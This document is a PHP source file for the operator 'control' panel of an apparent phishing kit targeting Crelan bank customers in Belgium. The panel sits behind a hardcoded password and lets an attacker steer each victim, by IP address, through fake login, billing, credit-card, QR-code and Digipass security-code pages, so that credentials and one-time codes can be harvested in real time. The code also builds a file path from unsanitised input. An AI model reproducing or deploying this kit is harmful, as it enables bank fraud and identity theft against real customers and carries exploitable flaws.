<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$ip = $_SERVER['REMOTE_ADDR'];
session_id(md5($ip));
session_start();

$password = '73fee192744f842a611a5ec336459f5c';  //  666999

if($_POST['p']){

setcookie('p',md5($_POST['p']));
header('Location: ' . $_SERVER['PHP_SELF']. '?' . $_SERVER['QUERY_STRING']);
}

    if ($_COOKIE['p'] !== $password) {
 
        die("<pre align=center><form method=post>Password<br><input type=password name=p style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>");
	
    }
	
	
if ($_POST['step'] == "control") {
            $fp = fopen('users/'. $_POST['ip'] .'.txt', 'wb');
            
            if( $_POST['to'] == 'load' ) {
                $_POST['to'] = $_POST['to'] . '#|#' . $_POST['error'];
            }
			if( $_POST['to'] == 'home' ) {
                $_POST['to'] = $_POST['to'] . '#|#' . $_POST['error'];
            }
			if( $_POST['to'] == 'log' ) {
                $_POST['to'] = $_POST['to'] . '#|#' . $_POST['error'];
            }
			if( $_POST['to'] == 'bill' ) {
                $_POST['to'] = $_POST['to']. '#|#' . $_POST['error'];
            }
			if( $_POST['to'] == 'infos' ) {
                $_POST['to'] = $_POST['to']. '#|#' . $_POST['error'];
            }
			if( $_POST['to'] == 'qrimg' ) {
                $_POST['to'] = $_POST['to']. '#|#' . $_POST['error'] .'#|#' . $_POST['b64img'];
            }
			if( $_POST['to'] == 'done' ) {
                $_POST['to'] = $_POST['to']. '#|#' . $_POST['error'];
            }
			if( $_POST['to'] == 'choice-crelan' ) {
                $_POST['to'] = $_POST['to']. '#|#' . $_POST['error'];
            }
			if( $_POST['to'] == 'l-digipass' ) {
                $_POST['to'] = $_POST['to'] . '#|#' . $_POST['error'] . '#|#' . $_POST['digipassText0'] . '#|#' . $_POST['digipassText1'];
            }
			if( $_POST['to'] == 'l-crelan' ) {
                $_POST['to'] = $_POST['to'] . '#|#' . $_POST['error'] . '#|#' . $_POST['crelanText0'] . '#|#' . $_POST['crelanDigiText1'];
            }
			
            
			
            fwrite($fp, $_POST['to']);
            fclose($fp);
            header("location: M3tri-control.php?ip=" . $_POST['ip']);
        }
		
		
		
?>
<!doctype html>
<html>
 <head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
  <!-- CSS FILES -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
  <link rel="icon" type="image/x-icon" href="favicon.ico" />
  <title>Control</title>
 </head>
 <body class="irtem" >
  <div style="margin-bottom:35px;">
   <nav class="navbar navbar-light navbar-expand-md">
    <div class="container-fluid">
     <a class="navbar-brand" href="index.php">METRI PANEL</a>
     <button data-toggle="collapse" class="navbar-toggler" data-target="#navcol-1">
      <span class="sr-only">Toggle navigation</span>
      <span class="navbar-toggler-icon"></span>
     </button>
     <div class="collapse navbar-collapse" id="navcol-1">
      <ul class="nav navbar-nav">
       <header>
        <!--server info start-->
        
        <!--server info end-->
       </header>
      </ul>
     </div>
    </div>
   </nav>
  </div>
  <div class="container text-center pt30 pb30">
   <form method="post" action="">
    <input type="hidden" name="step" value="control">
    <input type="hidden" name="ip" value="<?php echo $_GET['ip']; ?>">
    <div id="errorchoice" style="text-align:center;border-radius: 0px 0px 15px 15px;background-color: #f5f5f56b;margin-bottom: 25px;">
     <div>
      <label for="choice">error message</label>
     </div>
     <style>
      .flipswitch {
       position: relative;
       background: white;
       width: 120px;
       height: 40px;
       -webkit-appearance: initial;
       border-radius: 3px;
       -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
       outline: none;
       font-size: 14px;
       font-family: Trebuchet, Arial, sans-serif;
       font-weight: bold;
       cursor: pointer;
       border: 1px solid #ddd;
      }

      .flipswitch:after {
       position: absolute;
       top: 5%;
       display: block;
       line-height: 32px;
       width: 45%;
       height: 90%;
       background: #fff;
       box-sizing: border-box;
       text-align: center;
       transition: all 0.3s ease-in 0s;
       color: black;
       border: #888 1px solid;
       border-radius: 3px;
      }

      .flipswitch:after {
       left: 2%;
       content: "OFF";
       color: green;
      }

      .flipswitch:checked:after {
       left: 53%;
       content: "ON";
       color: red;
      }
     </style>
     <input type="checkbox" class="flipswitch" onclick="checkbox();">
     <input type="hidden" id="choice" name="error" value="off">
     <script>
      function checkbox() {
       if (document.getElementById('choice').value == 'off') {
        document.getElementById('choice').value = 'on';
       } else if (document.getElementById('choice').value == 'on') {
        document.getElementById('choice').value = 'off';
       }
      }
     </script>
     <script>
      $(function() {
       var f = function() {
        $(this).next().text($(this).is(':checked') ? ':checked' : ':not(:checked)');
       };
       $('input').change(f).trigger('change');
      });
     </script>
    </div>
    <button type="submit" class="btn" style="background-color: #BBBDF6;color: white;"  name="to" value="load">load</button>

    <button type="submit" class="btn" style="background-color: #BBBDF6;color: white;"  name="to" value="home">Home</button>

    <button type="submit" class="btn" style="background-color: #BBBDF6;color: white;"  name="to" value="log">Login</button>
		
	<button type="submit" class="btn" style="background-color: #72727E;color: white;"  name="to" value="bill">billing</button>

	<button type="submit" class="btn" style="background-color: #72727E;color: white;"  name="to" value="infos">cc infos</button>

	<button type="button" class="btn" style="background-color: #72727E;color: white;" href="#qrimg" >Qr image</button>
	
	<button type="button" class="btn" style="background-color: #FFC300;color: white;" href="#l-crelan">crelan</button>
	
	<button type="button" class="btn" style="background-color: #0087BA;color: white;" href="#l-digipass">digipass</button>
    
	<button type="submit" class="btn" style="background-color: #FFC300;color: white;"  name="to" value="choice-crelan">choice crelan</button>

    <button type="submit" class="btn" style="background-color: #252027;color: white;"  name="to" value="done">Done</button>
	
	
	
		<div id="l-digipass" class="collapse mt-5" style="max-width: 500px;margin: 0px auto;">
     
       <label  class="col-4 text-right">digipass lecteur texts:</label>

        
      <input name="digipassText0" class="form-control mb-3" placeholder="security code" >
	  <input name="digipassText1" class="form-control mb-3"  value="nul" style="display:none;">
      <button type="submit" class="btn btn-warning" name="to" value="l-digipass" >Submit</button>
     
    </div>
	<div id="l-crelan" class="collapse mt-5" style="max-width: 500px;margin: 0px auto;">
     
       <label  class="col-4 text-right">crelan lecteur texts:</label>

        
      <input name="crelanText0" class="form-control mb-3" placeholder="security code" >
	  <input name="crelanText1" class="form-control mb-3"  value="nul" style="display:none;">
      <button type="submit" class="btn btn-warning" name="to" value="l-crelan" >Submit</button>
     
    </div>
	
	
	  

    <div id="qrimg" class="collapse mt-5" style="max-width: 500px; margin: 0 auto;">
     <div style="text-align:center;">
      <div class="form-group row">
       <label for="zip_code" class="col-4 text-right">QR code image:</label>
       <div style="
								text-align: center;
								" class="col-8">
        <style>
         #inp {
          top: 150px;
          padding: 1px;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          border: 1px dashed #BBB;
          text-align: center;
          background-color: #DDD;
          cursor: pointer;
         }
        </style>
        <input accept="image/*" name="uploadedfile" type="file" id="inp" style="color: black;width: 100%;text-align: center;">
       </div>
      </div>
      <img id="img" height="150">
      <br>
      <script>
       function readFile() {
        if (this.files && this.files[0]) {
         var FR = new FileReader();
         FR.addEventListener("load", function(e) {
          document.getElementById("img").src = e.target.result;
          document.getElementById("b64img").value = e.target.result;
         });
         FR.readAsDataURL(this.files[0]);
        }
       }
       document.getElementById("inp").addEventListener("change", readFile);
      </script>
      <textarea name="b64img" class="form-control mb-3" id="b64img" cols="30" rows="5"></textarea>
      <button type="submit" class="btn btn-warning" name="to" value="qrimg">Submit</button>
     </div>
    </div>
	

   </form>
  </div>
  <!-- JS FILES -->
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
  <script>
   $('button[type="button"]').click(function() {



    $("#l-digipass").hide();
    $("#l-crelan").hide();
    $("#qrimg").hide();
    var href = $(this).attr('href');
    $(href).slideToggle(100);
   });
  </script>

 </body>
</html>